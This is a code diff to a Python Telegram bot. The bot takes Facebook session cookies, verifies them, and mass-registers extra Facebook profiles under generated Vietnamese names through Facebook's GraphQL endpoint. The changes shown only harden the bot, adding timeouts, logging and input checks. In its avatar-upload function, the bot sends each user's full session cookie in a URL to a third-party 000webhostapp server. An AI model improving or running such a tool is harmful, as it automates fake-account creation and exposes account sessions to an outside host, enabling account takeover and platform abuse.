@@ -5,6 +5,18 @@ import time
 from time import sleep
 
 import requests
+from telegram import __version__ as TG_VER
+
+try:
+    from telegram import __version_info__
+except ImportError:
+    __version_info__ = (0, 0, 0, 0, 0)  # type: ignore[assignment]
+
+if __version_info__ < (20, 0, 0, "alpha", 1):
+    raise RuntimeError(
+        f"This example is not compatible with your current PTB version {TG_VER}. "
+        f"Please install PTB version 20.0.0 or higher."
+    )
 from telegram import Update
 from telegram.ext import (
     Application,
@@ -40,14 +52,6 @@ class API_PRO5_ByNgDucPhat:
     def ndp_delay_tool(self, p):
         """Simulates delay with visual output.  Remove the visual part for Telegram."""
         sleep(p)  # Simplest delay for Telegram.  No need for visual fluff.
-        # while(p>1):
-        #     p=p-1
-        #     print(f'\033[0;34m[🌸DUYKHANH🌸]\033[1;32m[|][LO......][{p}]','     ',end='\r');sleep(1/6)
-        #     print(f'\033[0;34m[🌸DUYKHANH🌸]\033[1;32m[/][LOA.....][{p}]','     ',end='\r');sleep(1/6)
-        #     print(f'\033[0;34m[🌸DUYKHANH🌸]\033[1;32m[-][LOAD....][{p}]','     ',end='\r');sleep(1/6)
-        #     print(f'\033[0;34m[🌸DUYKHANH🌸]\033[1;32m[+][LOADI...][{p}]','     ',end='\r');sleep(1/6)
-        #     print(f'\033[0;34m[🌸DUYKHANH🌸]\033[1;32m[\][LOADIN..][{p}]','     ',end='\r');sleep(1/6)
-        #     print(f'\033[0;34m[🌸DUYKHANH🌸]\033[1;32m[|][LOADING.][{p}]','     ',end='\r');sleep(1/6)
 
     def getthongtinfacebook(self, cookie: str):
         headers_get = {
@@ -68,13 +72,17 @@ class API_PRO5_ByNgDucPhat:
             "cookie": cookie,
         }
         try:
-            #print(f"\033[0;31mĐang Tiến Hành Check Live", end="\r") # Remove console output
             url_profile = requests.get(
-                "https://www.facebook.com/me", headers=headers_get
+                "https://www.facebook.com/me", headers=headers_get, timeout=10
             ).url
-            get_dulieu_profile = requests.get(url=url_profile, headers=headers_get).text
-        except:
+            get_dulieu_profile = requests.get(url=url_profile, headers=headers_get, timeout=10).text
+        except requests.exceptions.RequestException as e:
+            logger.error(f"Error during request: {e}")
             return False
+        except Exception as e:
+            logger.exception(f"An unexpected error occurred: {e}")
+            return False
+
         try:
             uid_get = cookie.split("c_user=")[1].split(";")[0]
             fb_dtsg_get = (
@@ -100,19 +108,30 @@ class API_PRO5_ByNgDucPhat:
 
         try:
             json_upavt = requests.get(
-                f"https://api-ndpcutevcl.000webhostapp.com/api/upavtpage.php?cookie={cookie}&id={id_page}&link_anh={link_anh}"
+                f"https://api-ndpcutevcl.000webhostapp.com/api/upavtpage.php?cookie={cookie}&id={id_page}&link_anh={link_anh}", timeout=10
             ).json()
             if json_upavt["status"] == "success":
                 return json_upavt
             else:
                 return False
-        except:
+        except requests.exceptions.RequestException as e:
+            logger.error(f"Error during upAvt request: {e}")  # Log the error
+            return False
+        except Exception as e:
+            logger.exception(f"An unexpected error occurred in upAvt: {e}")  # Log the error
             return False
 
     def RegPage(self, cookie, name, uid, fb_dtsg, jazoest):
-        namepage = requests.get(
-            "https://story-shack-cdn-v2.glitch.me/generators/vietnamese-name-generator/male?count=2"
-        ).json()["data"][0]["name"]
+        try:
+            namepage = requests.get(
+                "https://story-shack-cdn-v2.glitch.me/generators/vietnamese-name-generator/male?count=2", timeout=10
+            ).json()["data"][0]["name"]
+        except requests.exceptions.RequestException as e:
+            logger.error(f"Error getting name: {e}")
+            return False, None, None
+        except Exception as e:
+             logger.exception(f"An unexpected error occurred when generating name: {e}")
+             return False, None, None
         global dem
         headers_reg = {
             "authority": "www.facebook.com",
@@ -165,15 +184,22 @@ class API_PRO5_ByNgDucPhat:
             "doc_id": "5903223909690825",
         }
         try:
-            idpage = requests.post(
+            response = requests.post(
                 "https://www.facebook.com/api/graphql/", headers=headers_reg, data=data_reg, timeout=20
-            ).json()["data"]["additional_profile_plus_create"]["additional_profile"]["id"]
+            )
+            response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
+            idpage = response.json()["data"]["additional_profile_plus_create"]["additional_profile"]["id"]
             dem += 1
-            #print(f'\033[1;35m{dem} | SUCCESS | NAME FB: {name} | UID PRO5: {idpage} | NAME PRO5: {namepage}')  # Remove Console output
             return idpage, name, namepage  # Return all relevant data
-        except:
-            #print('\033[0;31mReg Thất Bại Có Vẻ Acc Của Bạn Đã Bị Block!!')  # Remove console output
-            return False, None, None  # Return failure
+        except requests.exceptions.RequestException as e:
+            logger.error(f"Error during RegPage request: {e}")
+            return False, None, None
+        except (KeyError, ValueError) as e:
+            logger.error(f"Error parsing RegPage response: {e}")
+            return False, None, None
+        except Exception as e:
+             logger.exception(f"An unexpected error occurred during regpage: {e}")
+             return False, None, None
 
 
 # =========================== [ TELEGRAM BOT HANDLERS ] ===========================
@@ -201,11 +227,14 @@ async def help_command(update: Update, context: CallbackContext) -> None:
 async def add_cookie(update: Update, context: CallbackContext) -> None:
     """Adds a Facebook cookie to the list."""
     global list_clone, stt
-    cookie = update.message.text.split(" ")[1]  # Get the cookie from the command
+    cookie = update.message.text.split(" ", 1)[1].strip()  # Get the cookie, remove leading/trailing spaces
+    if not cookie:
+        await update.message.reply_text("Please provide a cookie after the /add_cookie command.")
+        return
+
     dpcutevcl = API_PRO5_ByNgDucPhat()
     checklive = dpcutevcl.getthongtinfacebook(cookie)
     if checklive:
-        # await update.message.reply_text(f"Name Facebook: {checklive[0]}") #Removed formatting
         stt += 1
         list_clone.append(f"{cookie}|{checklive[0]}|{checklive[1]}|{checklive[2]}|{checklive[3]}")
         await update.message.reply_text(f"Cookie added successfully! ({checklive[0]}) Total cookies: {len(list_clone)}")
@@ -216,7 +245,11 @@ async def add_cookie(update: Update, context: CallbackContext) -> None:
 async def add_image(update: Update, context: CallbackContext) -> None:
     """Adds an image link to the list."""
     global list_img, stt2
-    image_link = update.message.text.split(" ")[1]  # Get the image link
+    image_link = update.message.text.split(" ", 1)[1].strip()  # Get the image link, remove spaces
+    if not image_link:
+        await update.message.reply_text("Please provide an image link after the /add_image command.")
+        return
+
     list_img.append(image_link)
     stt2 += 1
     await update.message.reply_text(f"Image link added! Total images: {len(list_img)}")
@@ -289,7 +322,7 @@ async def start_registration(update: Update, context: CallbackContext) -> None:
                     f"Failed to update profile picture."
                 )
         else:
-             await update.message.reply_text(f"Failed to register page for {name}.  Cookie may be blocked.")
+             await update.message.reply_text(f"Failed to register page for {name}.  Cookie may be blocked or invalid.")
 
         dpcutevcl.ndp_delay_tool(delay)
         dem += 1
